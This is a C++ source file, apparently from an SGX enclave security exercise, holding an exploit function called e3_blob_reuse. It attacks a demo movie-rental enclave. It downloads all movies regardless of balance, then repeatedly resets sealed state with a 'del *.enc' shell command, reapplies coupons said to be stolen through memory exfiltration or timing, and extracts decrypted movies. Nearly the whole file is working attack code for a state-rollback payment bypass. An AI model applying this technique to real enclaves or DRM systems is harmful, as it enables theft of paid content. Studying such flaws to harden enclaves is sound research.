
#include "stdafx.h"
#include "exploits.h"
#include "common_enclave_actions.h"


void e3_blob_reuse(char* server_ip, int iport, char* library_folder)
{
	// create an enclave
	// copy the blob aside
	// get an epg
	// close an enclave
	// for all movies:
	// copy blob back
	// create enclave
	// read and save movie
	// close enclave
	// create an enclave
	set_print_mode(false);
	if (!load_enclave())
	{
		printf("\nCan not load enclave ...");
		return;
	}
	// get an epg
	unsigned int i, j;
	size_t * ids = nullptr;
	bool *is_payed = nullptr;
	unsigned int num_of_movies = 0;
	if (!init_enclave(server_ip, library_folder, iport))
	{
		printf("\nCan not initialize enclave for getting EPG...");
		return;
	}
	// close enclave
	if (!get_epg_info(&ids, &is_payed, &num_of_movies))
	{
		printf("\nCan not get EPG info. Is your server running ?");
		return;
	}

	// blob is prepared, copy it back
	char reset_state_command[1024];
	snprintf(reset_state_command, 1024, "del \"%s\\*.enc\"", library_folder);

	for (i = 0; i < num_of_movies; i++)
	{
		// download all  movies, exploits the fact that the movie is downloaded 
		// and stored ancrypted in any case without any relation to the current
		// coin balance

		if (!prepare_file(ids[i]))
		{
			printf("\nEXpected fail: Can not prepare encrypted movie(but it should be downloaded) , %zd . Is your server running ?", ids[i]);
		}
	}

	if (!unload_enclave())
	{
		printf("\nSomethign wrong, can not unload enclave.");
		return;
	}

	// for all payed movies

	for (i = 0; i < num_of_movies; i++)
	{
		// delete all the perfectly encrypted and excellently stored information 
		// from the previous session.

		system(reset_state_command);
		//	create an enclave

		if (!load_enclave())
		{
			printf("\nCan not load enclave for movie %zd ...", ids[i]);
			return;
		}
		if (!init_enclave(server_ip, library_folder, iport))
		{
			printf("\nCan not initialize enclave for movie %zd ...", ids[i]);
			return;
		}
		// apply all coupons, assuming we got them by one of other attacks, 
		// such as memory exfiltration or timing.
		// Practically we can do it only once and restore the blob file 
		// before enclave initialization. 
		char *coupons[5] =
		{
			"DVSE_CPN_10000000000000000000000",
			"DVSE_CPN_20000000000000000000000",
			"DVSE_CPN_30000000000000000000000",
			"DVSE_CPN_40000000000000000000000",
			"DVSE_CPN_50000000000000000000000"
		};
		for (j = 0; j < 5; j++)
		{
			if (!apply_coupon(coupons[j]))
			{
				printf("\nSomethign wrong, can not apply the coupon.");
				return;
			}
		}


		//  prepare the movie
		if (!prepare_file(ids[i]) )
		{
			SleepEx(2000, TRUE);
			if (!prepare_file(ids[i]))
			{
				printf("\nUNexpected fail: can not prepare encrypted movie. Is your server running ?");
				return;
			}
		}
		char filename_movie_out[1024];
		snprintf(filename_movie_out, 1024, "%s\\movie.blobreuse.decrypted.%zd.mp4", library_folder, ids[i]);

		//  read the file and store: coupons should give us a lot of coins
		extract_semi_allowed_file(ids[i], filename_movie_out);
		//  close enclave
		if (!unload_enclave())
		{
			printf("\nunload enclave. Is your server running ?");
			return;
		}
	}

}
